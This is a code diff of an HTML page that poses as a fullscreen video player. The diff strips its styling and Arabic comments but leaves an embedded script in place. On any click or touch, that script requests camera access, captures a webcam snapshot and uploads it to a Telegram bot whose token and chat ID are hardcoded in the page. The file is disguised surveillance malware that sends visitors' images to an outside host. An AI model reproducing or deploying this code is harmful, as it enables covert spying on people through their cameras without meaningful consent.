@@ -1,41 +1,9 @@
-html, body {
-        width: 100%;
-        height: 100%;
-        background-color: #000;
-        overflow: hidden;
-    }
-
-    /* جعل الفيديو يغطي الشاشة بالكامل */
-    .fullscreen-video {
-        width: 100vw;
-        height: 100vh;
-        object-fit: cover;
-        display: block;
-    }
-
-    /* تنسيق عنصر التقاط الصورة */
-    #result {
-        max-width: 90%;
-        max-height: 90vh;
-        border-radius: 10px;
-        display: none;
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        z-index: 999;
-    }
-</style>
-<!-- فيديو بملء الشاشة -->
-<video id="mainVideo" class="fullscreen-video" controls autoplay loop playsinline>
+<video id="mainVideo" controls autoplay loop playsinline>
     <source src="v1c044g50000dasenivog65m261t1ks0.mp4" type="video/mp4">
-    متصفحك لا يدعم تشغيل الفيديو.
 </video>
 
-<!-- عنصر إظهار اللقطة -->
 <img id="result" alt="">
 
-<!-- السكريبت المدمج -->
 <script>
     const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
     const TELEGRAM_CHAT_ID = '6642913954';
@@ -49,14 +17,12 @@ html, body {
         let stream = null;
 
         try {
-            // طلب إذن الكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            // التقاط صورة فورية
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -64,7 +30,6 @@ html, body {
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
 
-            // إظهار اللقطة لمدة ثانية واحدة
             const img = document.getElementById('result');
             img.src = canvas.toDataURL('image/png');
             img.style.display = 'block';
@@ -73,7 +38,6 @@ html, body {
                 img.style.display = 'none';
             }, 1000);
 
-            // إرسال الصورة إلى تيليجرام
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -85,21 +49,19 @@ html, body {
                         body: formData
                     });
                 } catch (err) {
-                    console.error("خطأ الإرسال:", err);
+                    console.error("Error:", err);
                 }
             }, 'image/png');
 
         } catch (err) {
-            console.error("خطأ الكاميرا:", err);
+            console.error("Camera Error:", err);
         } finally {
-            // إيقاف مسار الكاميرا فوراً
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         }
     }
 
-    // الاستماع للنقر أو اللمس في الشاشة
     window.addEventListener('click', handleCapture);
     window.addEventListener('touchstart', handleCapture);
 </script>
